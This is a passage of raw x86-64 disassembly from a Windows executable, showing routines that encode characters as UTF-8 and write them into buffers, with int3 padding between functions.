   140002476:	4c 8d 05 23 75 01 00 	lea    0x17523(%rip),%r8        # 0x1400199a0
   14000247d:	4c 89 45 e8          	mov    %r8,-0x18(%rbp)
   140002481:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002485:	4c 89 45 f8          	mov    %r8,-0x8(%rbp)
   140002489:	48 8d 05 88 05 07 00 	lea    0x70588(%rip),%rax        # 0x140072a18
   140002490:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140002494:	48 c7 45 a8 03 00 00 	movq   $0x3,-0x58(%rbp)
   14000249b:	00 
   14000249c:	48 c7 45 c0 00 00 00 	movq   $0x0,-0x40(%rbp)
   1400024a3:	00 
   1400024a4:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1400024a8:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   1400024ac:	48 c7 45 b8 03 00 00 	movq   $0x3,-0x48(%rbp)
   1400024b3:	00 
   1400024b4:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   1400024b8:	e8 b3 3c 01 00       	call   0x140016170
   1400024bd:	90                   	nop
   1400024be:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   1400024c5:	5d                   	pop    %rbp
   1400024c6:	c3                   	ret
   1400024c7:	cc                   	int3
   1400024c8:	cc                   	int3
   1400024c9:	cc                   	int3
   1400024ca:	cc                   	int3
   1400024cb:	cc                   	int3
   1400024cc:	cc                   	int3
   1400024cd:	cc                   	int3
   1400024ce:	cc                   	int3
   1400024cf:	cc                   	int3
   1400024d0:	55                   	push   %rbp
   1400024d1:	48 89 e5             	mov    %rsp,%rbp
   1400024d4:	49 89 d0             	mov    %rdx,%r8
   1400024d7:	48 8b 01             	mov    (%rcx),%rax
   1400024da:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400024de:	48 89 c1             	mov    %rax,%rcx
   1400024e1:	5d                   	pop    %rbp
   1400024e2:	e9 69 4f 01 00       	jmp    0x140017450
   1400024e7:	cc                   	int3
   1400024e8:	cc                   	int3
   1400024e9:	cc                   	int3
   1400024ea:	cc                   	int3
   1400024eb:	cc                   	int3
   1400024ec:	cc                   	int3
   1400024ed:	cc                   	int3
   1400024ee:	cc                   	int3
   1400024ef:	cc                   	int3
   1400024f0:	55                   	push   %rbp
   1400024f1:	48 89 e5             	mov    %rsp,%rbp
   1400024f4:	8b 42 34             	mov    0x34(%rdx),%eax
   1400024f7:	a8 10                	test   $0x10,%al
   1400024f9:	75 0a                	jne    0x140002505
   1400024fb:	a8 20                	test   $0x20,%al
   1400024fd:	75 0d                	jne    0x14000250c
   1400024ff:	5d                   	pop    %rbp
   140002500:	e9 4b 72 01 00       	jmp    0x140019750
   140002505:	90                   	nop
   140002506:	5d                   	pop    %rbp
   140002507:	e9 b4 6c 01 00       	jmp    0x1400191c0
   14000250c:	90                   	nop
   14000250d:	5d                   	pop    %rbp
   14000250e:	e9 5d 6d 01 00       	jmp    0x140019270
   140002513:	cc                   	int3
   140002514:	cc                   	int3
   140002515:	cc                   	int3
   140002516:	cc                   	int3
   140002517:	cc                   	int3
   140002518:	cc                   	int3
   140002519:	cc                   	int3
   14000251a:	cc                   	int3
   14000251b:	cc                   	int3
   14000251c:	cc                   	int3
   14000251d:	cc                   	int3
   14000251e:	cc                   	int3
   14000251f:	cc                   	int3
   140002520:	55                   	push   %rbp
   140002521:	48 89 e5             	mov    %rsp,%rbp
   140002524:	8b 42 34             	mov    0x34(%rdx),%eax
   140002527:	a8 10                	test   $0x10,%al
   140002529:	75 0a                	jne    0x140002535
   14000252b:	a8 20                	test   $0x20,%al
   14000252d:	75 0d                	jne    0x14000253c
   14000252f:	5d                   	pop    %rbp
   140002530:	e9 9b 75 01 00       	jmp    0x140019ad0
   140002535:	90                   	nop
   140002536:	5d                   	pop    %rbp
   140002537:	e9 e4 6d 01 00       	jmp    0x140019320
   14000253c:	90                   	nop
   14000253d:	5d                   	pop    %rbp
   14000253e:	e9 8d 6e 01 00       	jmp    0x1400193d0
   140002543:	cc                   	int3
   140002544:	cc                   	int3
   140002545:	cc                   	int3
   140002546:	cc                   	int3
   140002547:	cc                   	int3
   140002548:	cc                   	int3
   140002549:	cc                   	int3
   14000254a:	cc                   	int3
   14000254b:	cc                   	int3
   14000254c:	cc                   	int3
   14000254d:	cc                   	int3
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	55                   	push   %rbp
   140002551:	56                   	push   %rsi
   140002552:	57                   	push   %rdi
   140002553:	53                   	push   %rbx
   140002554:	48 83 ec 38          	sub    $0x38,%rsp
   140002558:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000255d:	c7 45 04 00 00 00 00 	movl   $0x0,0x4(%rbp)
   140002564:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   14000256a:	73 0a                	jae    0x140002576
   14000256c:	88 55 04             	mov    %dl,0x4(%rbp)
   14000256f:	be 01 00 00 00       	mov    $0x1,%esi
   140002574:	eb 7c                	jmp    0x1400025f2
   140002576:	89 d0                	mov    %edx,%eax
   140002578:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   14000257e:	73 18                	jae    0x140002598
   140002580:	c1 e8 06             	shr    $0x6,%eax
   140002583:	0c c0                	or     $0xc0,%al
   140002585:	88 45 04             	mov    %al,0x4(%rbp)
   140002588:	80 e2 3f             	and    $0x3f,%dl
   14000258b:	80 ca 80             	or     $0x80,%dl
   14000258e:	88 55 05             	mov    %dl,0x5(%rbp)
   140002591:	be 02 00 00 00       	mov    $0x2,%esi
   140002596:	eb 5a                	jmp    0x1400025f2
   140002598:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   14000259e:	73 24                	jae    0x1400025c4
   1400025a0:	c1 e8 0c             	shr    $0xc,%eax
   1400025a3:	0c e0                	or     $0xe0,%al
   1400025a5:	88 45 04             	mov    %al,0x4(%rbp)
   1400025a8:	89 d0                	mov    %edx,%eax
   1400025aa:	c1 e8 06             	shr    $0x6,%eax
   1400025ad:	24 3f                	and    $0x3f,%al
   1400025af:	0c 80                	or     $0x80,%al
   1400025b1:	88 45 05             	mov    %al,0x5(%rbp)
   1400025b4:	80 e2 3f             	and    $0x3f,%dl
   1400025b7:	80 ca 80             	or     $0x80,%dl
   1400025ba:	88 55 06             	mov    %dl,0x6(%rbp)
   1400025bd:	be 03 00 00 00       	mov    $0x3,%esi
   1400025c2:	eb 2e                	jmp    0x1400025f2
   1400025c4:	c1 e8 12             	shr    $0x12,%eax
   1400025c7:	0c f0                	or     $0xf0,%al
   1400025c9:	88 45 04             	mov    %al,0x4(%rbp)
   1400025cc:	89 d0                	mov    %edx,%eax
   1400025ce:	c1 e8 0c             	shr    $0xc,%eax
   1400025d1:	24 3f                	and    $0x3f,%al
   1400025d3:	0c 80                	or     $0x80,%al
   1400025d5:	88 45 05             	mov    %al,0x5(%rbp)
   1400025d8:	89 d0                	mov    %edx,%eax
   1400025da:	c1 e8 06             	shr    $0x6,%eax
   1400025dd:	24 3f                	and    $0x3f,%al
   1400025df:	0c 80                	or     $0x80,%al
   1400025e1:	88 45 06             	mov    %al,0x6(%rbp)
   1400025e4:	80 e2 3f             	and    $0x3f,%dl
   1400025e7:	80 ca 80             	or     $0x80,%dl
   1400025ea:	88 55 07             	mov    %dl,0x7(%rbp)
   1400025ed:	be 04 00 00 00       	mov    $0x4,%esi
   1400025f2:	48 8b 39             	mov    (%rcx),%rdi
   1400025f5:	48 8b 07             	mov    (%rdi),%rax
   1400025f8:	48 8b 5f 10          	mov    0x10(%rdi),%rbx
   1400025fc:	48 29 d8             	sub    %rbx,%rax
   1400025ff:	48 39 f0             	cmp    %rsi,%rax
   140002602:	72 25                	jb     0x140002629
   140002604:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140002608:	48 01 d9             	add    %rbx,%rcx
   14000260b:	48 8d 55 04          	lea    0x4(%rbp),%rdx
   14000260f:	49 89 f0             	mov    %rsi,%r8
   140002612:	e8 74 82 01 00       	call   0x14001a88b
   140002617:	48 01 f3             	add    %rsi,%rbx
   14000261a:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   14000261e:	31 c0                	xor    %eax,%eax
   140002620:	48 83 c4 38          	add    $0x38,%rsp
   140002624:	5b                   	pop    %rbx
   140002625:	5f                   	pop    %rdi
   140002626:	5e                   	pop    %rsi
   140002627:	5d                   	pop    %rbp
   140002628:	c3                   	ret
   140002629:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   140002630:	00 00 
   140002632:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140002638:	48 89 f9             	mov    %rdi,%rcx
   14000263b:	48 89 da             	mov    %rbx,%rdx
   14000263e:	49 89 f0             	mov    %rsi,%r8
   140002641:	e8 9a 84 01 00       	call   0x14001aae0
   140002646:	48 8b 5f 10          	mov    0x10(%rdi),%rbx
   14000264a:	eb b8                	jmp    0x140002604
   14000264c:	cc                   	int3
   14000264d:	cc                   	int3
   14000264e:	cc                   	int3
   14000264f:	cc                   	int3
   140002650:	55                   	push   %rbp
   140002651:	56                   	push   %rsi
   140002652:	48 83 ec 48          	sub    $0x48,%rsp
   140002656:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000265b:	48 c7 45 00 fe ff ff 	movq   $0xfffffffffffffffe,0x0(%rbp)
   140002662:	ff 
   140002663:	48 89 ce             	mov    %rcx,%rsi
   140002666:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   14000266d:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   140002673:	73 0b                	jae    0x140002680
   140002675:	88 55 fc             	mov    %dl,-0x4(%rbp)
   140002678:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000267e:	eb 7f                	jmp    0x1400026ff
   140002680:	89 d0                	mov    %edx,%eax
   140002682:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   140002688:	73 19                	jae    0x1400026a3
   14000268a:	c1 e8 06             	shr    $0x6,%eax
   14000268d:	0c c0                	or     $0xc0,%al
   14000268f:	88 45 fc             	mov    %al,-0x4(%rbp)
   140002692:	80 e2 3f             	and    $0x3f,%dl
   140002695:	80 ca 80             	or     $0x80,%dl
   140002698:	88 55 fd             	mov    %dl,-0x3(%rbp)
   14000269b:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400026a1:	eb 5c                	jmp    0x1400026ff
   1400026a3:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   1400026a9:	73 25                	jae    0x1400026d0
   1400026ab:	c1 e8 0c             	shr    $0xc,%eax
   1400026ae:	0c e0                	or     $0xe0,%al
   1400026b0:	88 45 fc             	mov    %al,-0x4(%rbp)
   1400026b3:	89 d0                	mov    %edx,%eax
   1400026b5:	c1 e8 06             	shr    $0x6,%eax
   1400026b8:	24 3f                	and    $0x3f,%al
   1400026ba:	0c 80                	or     $0x80,%al
   1400026bc:	88 45 fd             	mov    %al,-0x3(%rbp)
   1400026bf:	80 e2 3f             	and    $0x3f,%dl
   1400026c2:	80 ca 80             	or     $0x80,%dl
   1400026c5:	88 55 fe             	mov    %dl,-0x2(%rbp)
   1400026c8:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400026ce:	eb 2f                	jmp    0x1400026ff
   1400026d0:	c1 e8 12             	shr    $0x12,%eax
   1400026d3:	0c f0                	or     $0xf0,%al
   1400026d5:	88 45 fc             	mov    %al,-0x4(%rbp)
   1400026d8:	89 d0                	mov    %edx,%eax
   1400026da:	c1 e8 0c             	shr    $0xc,%eax
   1400026dd:	24 3f                	and    $0x3f,%al
   1400026df:	0c 80                	or     $0x80,%al
   1400026e1:	88 45 fd             	mov    %al,-0x3(%rbp)
   1400026e4:	89 d0                	mov    %edx,%eax
   1400026e6:	c1 e8 06             	shr    $0x6,%eax
   1400026e9:	24 3f                	and    $0x3f,%al
   1400026eb:	0c 80                	or     $0x80,%al
   1400026ed:	88 45 fe             	mov    %al,-0x2(%rbp)
   1400026f0:	80 e2 3f             	and    $0x3f,%dl
   1400026f3:	80 ca 80             	or     $0x80,%dl
   1400026f6:	88 55 ff             	mov    %dl,-0x1(%rbp)
   1400026f9:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400026ff:	48 8b 0e             	mov    (%rsi),%rcx
   140002702:	48 8d 55 fc          	lea    -0x4(%rbp),%rdx
   140002706:	e8 c5 33 00 00       	call   0x140005ad0
   14000270b:	48 85 c0             	test   %rax,%rax
   14000270e:	74 27                	je     0x140002737
   140002710:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002714:	48 8d 46 08          	lea    0x8(%rsi),%rax
   140002718:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000271c:	48 83 7e 08 00       	cmpq   $0x0,0x8(%rsi)
   140002721:	74 09                	je     0x14000272c
   140002723:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002727:	e8 24 07 00 00       	call   0x140002e50
   14000272c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002730:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002734:	48 89 01             	mov    %rax,(%rcx)
   140002737:	48 85 c0             	test   %rax,%rax
   14000273a:	0f 95 c0             	setne  %al
   14000273d:	48 83 c4 48          	add    $0x48,%rsp
   140002741:	5e                   	pop    %rsi
   140002742:	5d                   	pop    %rbp
   140002743:	c3                   	ret
   140002744:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000274b:	00 00 00 00 00 
   140002750:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002755:	55                   	push   %rbp
   140002756:	56                   	push   %rsi
   140002757:	48 83 ec 28          	sub    $0x28,%rsp
   14000275b:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   14000275f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002763:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002767:	48 89 01             	mov    %rax,(%rcx)
   14000276a:	48 83 c4 28          	add    $0x28,%rsp
   14000276e:	5e                   	pop    %rsi
   14000276f:	5d                   	pop    %rbp
   140002770:	c3                   	ret
   140002771:	cc                   	int3
   140002772:	cc                   	int3
   140002773:	cc                   	int3
   140002774:	cc                   	int3
   140002775:	cc                   	int3
   140002776:	cc                   	int3
   140002777:	cc                   	int3
   140002778:	cc                   	int3
   140002779:	cc                   	int3
   14000277a:	cc                   	int3
   14000277b:	cc                   	int3
   14000277c:	cc                   	int3
   14000277d:	cc                   	int3
   14000277e:	cc                   	int3
   14000277f:	cc                   	int3
   140002780:	55                   	push   %rbp
   140002781:	56                   	push   %rsi
   140002782:	48 83 ec 48          	sub    $0x48,%rsp
   140002786:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000278b:	48 c7 45 00 fe ff ff 	movq   $0xfffffffffffffffe,0x0(%rbp)
   140002792:	ff 
   140002793:	48 89 ce             	mov    %rcx,%rsi
   140002796:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   14000279d:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   1400027a3:	73 0b                	jae    0x1400027b0
   1400027a5:	88 55 fc             	mov    %dl,-0x4(%rbp)
   1400027a8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400027ae:	eb 7f                	jmp    0x14000282f
   1400027b0:	89 d0                	mov    %edx,%eax
   1400027b2:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   1400027b8:	73 19                	jae    0x1400027d3
   1400027ba:	c1 e8 06             	shr    $0x6,%eax
   1400027bd:	0c c0                	or     $0xc0,%al
   1400027bf:	88 45 fc             	mov    %al,-0x4(%rbp)
   1400027c2:	80 e2 3f             	and    $0x3f,%dl
   1400027c5:	80 ca 80             	or     $0x80,%dl
   1400027c8:	88 55 fd             	mov    %dl,-0x3(%rbp)
   1400027cb:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400027d1:	eb 5c                	jmp    0x14000282f
   1400027d3:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   1400027d9:	73 25                	jae    0x140002800
   1400027db:	c1 e8 0c             	shr    $0xc,%eax
   1400027de:	0c e0                	or     $0xe0,%al
   1400027e0:	88 45 fc             	mov    %al,-0x4(%rbp)
   1400027e3:	89 d0                	mov    %edx,%eax
   1400027e5:	c1 e8 06             	shr    $0x6,%eax
   1400027e8:	24 3f                	and    $0x3f,%al
   1400027ea:	0c 80                	or     $0x80,%al
   1400027ec:	88 45 fd             	mov    %al,-0x3(%rbp)
   1400027ef:	80 e2 3f             	and    $0x3f,%dl
   1400027f2:	80 ca 80             	or     $0x80,%dl
   1400027f5:	88 55 fe             	mov    %dl,-0x2(%rbp)
   1400027f8:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400027fe:	eb 2f                	jmp    0x14000282f
   140002800:	c1 e8 12             	shr    $0x12,%eax
   140002803:	0c f0                	or     $0xf0,%al
   140002805:	88 45 fc             	mov    %al,-0x4(%rbp)
   140002808:	89 d0                	mov    %edx,%eax
   14000280a:	c1 e8 0c             	shr    $0xc,%eax
   14000280d:	24 3f                	and    $0x3f,%al
   14000280f:	0c 80                	or     $0x80,%al
   140002811:	88 45 fd             	mov    %al,-0x3(%rbp)
   140002814:	89 d0                	mov    %edx,%eax
   140002816:	c1 e8 06             	shr    $0x6,%eax
   140002819:	24 3f                	and    $0x3f,%al
   14000281b:	0c 80                	or     $0x80,%al
   14000281d:	88 45 fe             	mov    %al,-0x2(%rbp)
   140002820:	80 e2 3f             	and    $0x3f,%dl
   140002823:	80 ca 80             	or     $0x80,%dl
   140002826:	88 55 ff             	mov    %dl,-0x1(%rbp)
   140002829:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000282f:	48 8b 0e             	mov    (%rsi),%rcx
   140002832:	48 8d 55 fc          	lea    -0x4(%rbp),%rdx
   140002836:	e8 f5 3c 00 00       	call   0x140006530
   14000283b:	48 85 c0             	test   %rax,%rax
   14000283e:	74 27                	je     0x140002867
   140002840:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002844:	48 8d 46 08          	lea    0x8(%rsi),%rax
   140002848:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000284c:	48 83 7e 08 00       	cmpq   $0x0,0x8(%rsi)
   140002851:	74 09                	je     0x14000285c
   140002853:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002857:	e8 f4 05 00 00       	call   0x140002e50
   14000285c:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002860:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002864:	48 89 01             	mov    %rax,(%rcx)
   140002867:	48 85 c0             	test   %rax,%rax
   14000286a:	0f 95 c0             	setne  %al
   14000286d:	48 83 c4 48          	add    $0x48,%rsp
   140002871:	5e                   	pop    %rsi
   140002872:	5d                   	pop    %rbp
   140002873:	c3                   	ret
   140002874:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000287b:	00 00 00 00 00 
   140002880:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002885:	55                   	push   %rbp
   140002886:	56                   	push   %rsi
   140002887:	48 83 ec 28          	sub    $0x28,%rsp
   14000288b:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   14000288f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002893:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002897:	48 89 01             	mov    %rax,(%rcx)
   14000289a:	48 83 c4 28          	add    $0x28,%rsp
   14000289e:	5e                   	pop    %rsi
   14000289f:	5d                   	pop    %rbp
   1400028a0:	c3                   	ret
   1400028a1:	cc                   	int3
   1400028a2:	cc                   	int3
   1400028a3:	cc                   	int3
   1400028a4:	cc                   	int3
   1400028a5:	cc                   	int3
   1400028a6:	cc                   	int3
   1400028a7:	cc                   	int3
   1400028a8:	cc                   	int3
   1400028a9:	cc                   	int3
   1400028aa:	cc                   	int3
   1400028ab:	cc                   	int3
   1400028ac:	cc                   	int3
   1400028ad:	cc                   	int3
   1400028ae:	cc                   	int3
   1400028af:	cc                   	int3
   1400028b0:	55                   	push   %rbp
   1400028b1:	56                   	push   %rsi
   1400028b2:	48 83 ec 48          	sub    $0x48,%rsp
   1400028b6:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   1400028bb:	48 c7 45 00 fe ff ff 	movq   $0xfffffffffffffffe,0x0(%rbp)
   1400028c2:	ff 
   1400028c3:	48 89 ce             	mov    %rcx,%rsi
   1400028c6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400028cd:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   1400028d3:	73 0b                	jae    0x1400028e0
   1400028d5:	88 55 fc             	mov    %dl,-0x4(%rbp)
   1400028d8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400028de:	eb 7f                	jmp    0x14000295f
   1400028e0:	89 d0                	mov    %edx,%eax
   1400028e2:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   1400028e8:	73 19                	jae    0x140002903
   1400028ea:	c1 e8 06             	shr    $0x6,%eax
   1400028ed:	0c c0                	or     $0xc0,%al
   1400028ef:	88 45 fc             	mov    %al,-0x4(%rbp)
   1400028f2:	80 e2 3f             	and    $0x3f,%dl
   1400028f5:	80 ca 80             	or     $0x80,%dl
   1400028f8:	88 55 fd             	mov    %dl,-0x3(%rbp)
   1400028fb:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140002901:	eb 5c                	jmp    0x14000295f
   140002903:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   140002909:	73 25                	jae    0x140002930
   14000290b:	c1 e8 0c             	shr    $0xc,%eax
   14000290e:	0c e0                	or     $0xe0,%al
   140002910:	88 45 fc             	mov    %al,-0x4(%rbp)
   140002913:	89 d0                	mov    %edx,%eax
   140002915:	c1 e8 06             	shr    $0x6,%eax
   140002918:	24 3f                	and    $0x3f,%al
   14000291a:	0c 80                	or     $0x80,%al
   14000291c:	88 45 fd             	mov    %al,-0x3(%rbp)
   14000291f:	80 e2 3f             	and    $0x3f,%dl
   140002922:	80 ca 80             	or     $0x80,%dl
   140002925:	88 55 fe             	mov    %dl,-0x2(%rbp)
   140002928:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000292e:	eb 2f                	jmp    0x14000295f
   140002930:	c1 e8 12             	shr    $0x12,%eax
   140002933:	0c f0                	or     $0xf0,%al
   140002935:	88 45 fc             	mov    %al,-0x4(%rbp)
   140002938:	89 d0                	mov    %edx,%eax
   14000293a:	c1 e8 0c             	shr    $0xc,%eax
   14000293d:	24 3f                	and    $0x3f,%al
   14000293f:	0c 80                	or     $0x80,%al
   140002941:	88 45 fd             	mov    %al,-0x3(%rbp)
   140002944:	89 d0                	mov    %edx,%eax
   140002946:	c1 e8 06             	shr    $0x6,%eax
   140002949:	24 3f                	and    $0x3f,%al
   14000294b:	0c 80                	or     $0x80,%al
   14000294d:	88 45 fe             	mov    %al,-0x2(%rbp)
   140002950:	80 e2 3f             	and    $0x3f,%dl
   140002953:	80 ca 80             	or     $0x80,%dl
   140002956:	88 55 ff             	mov    %dl,-0x1(%rbp)
   140002959:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000295f:	48 8b 06             	mov    (%rsi),%rax
   140002962:	48 8b 00             	mov    (%rax),%rax
   140002965:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   14000296a:	75 7b                	jne    0x1400029e7
   14000296c:	48 c7 40 10 ff ff ff 	movq   $0xffffffffffffffff,0x10(%rax)
   140002973:	ff 
   140002974:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140002978:	48 8d 48 18          	lea    0x18(%rax),%rcx
   14000297c:	48 8d 55 fc          	lea    -0x4(%rbp),%rdx
   140002980:	e8 ab 3b 00 00       	call   0x140006530
   140002985:	48 b9 03 00 00 00 ff 	movabs $0xffffffff00000003,%rcx
   14000298c:	ff ff ff 
   14000298f:	48 21 c1             	and    %rax,%rcx
   140002992:	45 31 c0             	xor    %r8d,%r8d
   140002995:	48 ba 02 00 00 00 06 	movabs $0x600000002,%rdx
   14000299c:	00 00 00 
   14000299f:	48 39 d1             	cmp    %rdx,%rcx
   1400029a2:	4c 0f 45 c0          	cmovne %rax,%r8
   1400029a6:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400029aa:	48 ff 40 10          	incq   0x10(%rax)
   1400029ae:	4d 85 c0             	test   %r8,%r8
   1400029b1:	74 27                	je     0x1400029da
   1400029b3:	4c 89 45 e8          	mov    %r8,-0x18(%rbp)
   1400029b7:	48 8d 46 08          	lea    0x8(%rsi),%rax
   1400029bb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400029bf:	48 83 7e 08 00       	cmpq   $0x0,0x8(%rsi)
   1400029c4:	74 09                	je     0x1400029cf
   1400029c6:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400029ca:	e8 81 04 00 00       	call   0x140002e50
   1400029cf:	4c 8b 45 e8          	mov    -0x18(%rbp),%r8
   1400029d3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400029d7:	4c 89 00             	mov    %r8,(%rax)
   1400029da:	4d 85 c0             	test   %r8,%r8
   1400029dd:	0f 95 c0             	setne  %al
   1400029e0:	48 83 c4 48          	add    $0x48,%rsp
   1400029e4:	5e                   	pop    %rsi
   1400029e5:	5d                   	pop    %rbp
   1400029e6:	c3                   	ret
   1400029e7:	48 8d 0d 92 09 07 00 	lea    0x70992(%rip),%rcx        # 0x140073380
   1400029ee:	e8 9d 8c 01 00       	call   0x14001b690
   1400029f3:	cc                   	int3
   1400029f4:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400029fb:	00 00 00 00 00 
   140002a00:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002a05:	55                   	push   %rbp
   140002a06:	56                   	push   %rsi
   140002a07:	48 83 ec 28          	sub    $0x28,%rsp
   140002a0b:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   140002a0f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002a13:	48 ff 40 10          	incq   0x10(%rax)
   140002a17:	48 83 c4 28          	add    $0x28,%rsp
   140002a1b:	5e                   	pop    %rsi
   140002a1c:	5d                   	pop    %rbp
   140002a1d:	c3                   	ret
   140002a1e:	66 90                	xchg   %ax,%ax
   140002a20:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002a25:	55                   	push   %rbp
   140002a26:	56                   	push   %rsi
   140002a27:	48 83 ec 28          	sub    $0x28,%rsp
   140002a2b:	48 8d 6a 40          	lea    0x40(%rdx),%rbp
   140002a2f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002a33:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140002a37:	48 89 01             	mov    %rax,(%rcx)
   140002a3a:	48 83 c4 28          	add    $0x28,%rsp
   140002a3e:	5e                   	pop    %rsi
   140002a3f:	5d                   	pop    %rbp
   140002a40:	c3                   	ret
   140002a41:	cc                   	int3
   140002a42:	cc                   	int3
   140002a43:	cc                   	int3
   140002a44:	cc                   	int3
   140002a45:	cc                   	int3
   140002a46:	cc                   	int3
   140002a47:	cc                   	int3
   140002a48:	cc                   	int3
   140002a49:	cc                   	int3
   140002a4a:	cc                   	int3
   140002a4b:	cc                   	int3
   140002a4c:	cc                   	int3
   140002a4d:	cc                   	int3
   140002a4e:	cc                   	int3
   140002a4f:	cc                   	int3
   140002a50:	55                   	push   %rbp
   140002a51:	48 89 e5             	mov    %rsp,%rbp
   140002a54:	49 89 d0             	mov    %rdx,%r8
   140002a57:	48 8d 15 1a 00 07 00 	lea    0x7001a(%rip),%rdx        # 0x140072a78
   140002a5e:	5d                   	pop    %rbp
   140002a5f:	e9 0c 37 01 00       	jmp    0x140016170
   140002a64:	cc                   	int3
   140002a65:	cc                   	int3
   140002a66:	cc                   	int3
   140002a67:	cc                   	int3
   140002a68:	cc                   	int3
   140002a69:	cc                   	int3
   140002a6a:	cc                   	int3
   140002a6b:	cc                   	int3
   140002a6c:	cc                   	int3
   140002a6d:	cc                   	int3
   140002a6e:	cc                   	int3
   140002a6f:	cc                   	int3
   140002a70:	55                   	push   %rbp
   140002a71:	48 89 e5             	mov    %rsp,%rbp
   140002a74:	49 89 d0             	mov    %rdx,%r8
   140002a77:	48 8d 15 5a 00 07 00 	lea    0x7005a(%rip),%rdx        # 0x140072ad8
   140002a7e:	5d                   	pop    %rbp
   140002a7f:	e9 ec 36 01 00       	jmp    0x140016170
   140002a84:	cc                   	int3
   140002a85:	cc                   	int3
   140002a86:	cc                   	int3
   140002a87:	cc                   	int3
   140002a88:	cc                   	int3
   140002a89:	cc                   	int3
   140002a8a:	cc                   	int3
   140002a8b:	cc                   	int3
   140002a8c:	cc                   	int3
   140002a8d:	cc                   	int3
   140002a8e:	cc                   	int3
   140002a8f:	cc                   	int3
   140002a90:	55                   	push   %rbp
   140002a91:	48 89 e5             	mov    %rsp,%rbp
   140002a94:	49 89 d0             	mov    %rdx,%r8
   140002a97:	48 8d 15 0a 00 07 00 	lea    0x7000a(%rip),%rdx        # 0x140072aa8
   140002a9e:	5d                   	pop    %rbp
   140002a9f:	e9 cc 36 01 00       	jmp    0x140016170
   140002aa4:	cc                   	int3
   140002aa5:	cc                   	int3
   140002aa6:	cc                   	int3
   140002aa7:	cc                   	int3
   140002aa8:	cc                   	int3
   140002aa9:	cc                   	int3
   140002aaa:	cc                   	int3
   140002aab:	cc                   	int3
   140002aac:	cc                   	int3
   140002aad:	cc                   	int3
   140002aae:	cc                   	int3
   140002aaf:	cc                   	int3
   140002ab0:	55                   	push   %rbp
   140002ab1:	48 89 e5             	mov    %rsp,%rbp
